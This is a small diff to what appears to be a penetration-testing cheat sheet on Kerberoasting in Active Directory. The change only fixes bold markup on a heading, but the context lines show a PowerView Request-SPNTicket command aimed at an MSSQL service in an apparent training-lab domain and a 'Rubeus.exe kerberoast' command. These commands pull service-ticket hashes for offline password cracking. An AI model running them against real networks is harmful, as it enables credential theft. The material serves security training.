@@ -71,7 +71,7 @@ Any valid domain user can request a kerberos ticket (ST) for any domain service.
     #Get Kerberoast Hash of a single user
     Request-SPNTicket -SPN "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local" -Format Hashcat
     ```
-* **Rubeus
+* **Rubeus**  
     ```powershell
     Rubeus.exe kerberoast /nowrap
     ```
